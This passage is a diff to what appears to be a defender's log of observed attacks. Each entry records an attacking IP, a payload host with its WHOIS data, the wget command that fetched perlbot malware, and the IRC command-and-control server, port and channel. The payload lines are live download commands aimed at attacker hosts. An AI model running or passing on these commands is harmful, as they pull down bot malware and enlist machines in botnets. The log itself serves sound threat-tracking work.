@@ -984,6 +984,133 @@ Notes:
 -300+ bots as 10/20/14 when I live tweeted.
 -other pitchers: 89.136.120.205
 
+#12/5/14
+
+Pitcher: 192.99.6.106
+Catcher: 
+Nslookup (pitcher):ns508900.ip-192-99-6.net
+WHOIS (pitcher):
+192.99.0.0/16
+OVH Hosting, Inc.
+CA
+abuse@ovh.ca
+AS16276
+NSlookup (catcher): NX
+WHOIS (catcher):
+88.150.140.0/22
+tech solutions group
+GB
+�cntrl@thetechsolgroup.com
+AS20860
+Payload: wget http://88.150.140.66/sacd
+Description: perlbot
+Server: 104.200.65.162
+Port: 21
+Channel: #php
+NSlookup: NX
+WHOIS:
+104.200.65.0/24
+Stealthy Hosting
+Notes:
+- over 400 attacks from this pitcher on 12/4; seen more in days' past.
+
+Pitcher: 94.102.51.30
+Catcher: 173.208.146.42
+Nslookup (pitcher): hosted-by.ecatel.net.
+WHOIS (pitcher):
+94.102.48.0/20
+Ecatel Ltd.
+NL
+abuse@ecatel.info
+AS29073
+NSlookup (catcher): NX
+WHOIS (catcher):
+173.208.128.0/17
+WholeSale Internet, Inc.
+US
+abuse@wholesaleinternet.net
+AS32097
+Payload: wget -q http://173.208.146.42/me.pl
+Description: perlbot
+Server: 173.208.146.46
+Port: 6667
+Channel: #pbot#
+NSlookup: NX
+WHOIS:
+173.208.128.0/17
+WholeSale Internet, Inc.
+US
+abuse@wholesaleinternet.net
+AS32097
+Notes:
+-similar to attacks seen in the past where the catcher was a peakinter.net IP address.
+
+#1/5/15
+Pitcher: 198.154.60.143
+Catcher: pisosdemaderaw.com.mx; www.finecloves.com
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+198.154.60.0/22
+FortaTrust USA Corporation
+USA
+ipadmin@fortatrust.com
+AS26272
+NSlookup (catcher):
+158.85.228.131 (pisosdemaderaw.com), 173.236.194.70 (www.finecloves.com
+WHOIS (catcher):
+(pisosdemaderaw.com)
+158.85.228.131/32, 158.85.0.0/16
+QualityHostOnline/SoftLayer
+US
+abuse@serverquality.com
+(www.finecloves.com)
+173.236.128.0/17
+New Dream Network LLC
+US
+abuse@dreamhost.com
+AS26347
+Payload: wget http://pisosdemaderaw.com.mx/sekip/sekip.php;wget http://www.finecloves.com/apache/new.txt
+Description: IP recording script + perlbot? (payload unavailable for analysis.)
+Server: NA
+Port: NA
+Channel: NA
+NSlookup: NA
+WHOIS: NA
+Notes:
+- http://pisosdemaderaw.com.mx/sekip/sekip.php is a php script that records the IP address of the client that requests the page. It then logs the IP to /sekip/sekip.txt and redirects web-based clients to google.com
+- the second payload, "new.txt" was unavailable for analysis.
+
+Pitcher: 37.187.135.6
+Catcher: 185.56.60.83
+Nslookup (pitcher):
+WHOIS (pitcher):
+37.187.0.0/16
+OVH SAS
+FR
+abuse@ovh.net
+AS16276
+NSlookup (catcher):
+WHOIS (catcher):
+185.56.60.0/22
+Orange Lemon BV
+NL
+abuse@orangelemon.nl
+AS49544
+Payload: wget http://185.56.60.83/il.pdf
+Description: perlbot
+Server: 69.162.97.106
+Port: 8443
+Channel: #php
+NSlookup:
+WHOIS:
+69.162.64.0/18
+Limestone Networks
+US
+abuse@limestonenetworks.com
+Notes:
+-Oh hey! It's this guy again. and just in time for the new year.
+- 72.18.138.178
+
 
 #Template. CHOOSE YOUR OWN ADVENTURE!
 Pitcher:
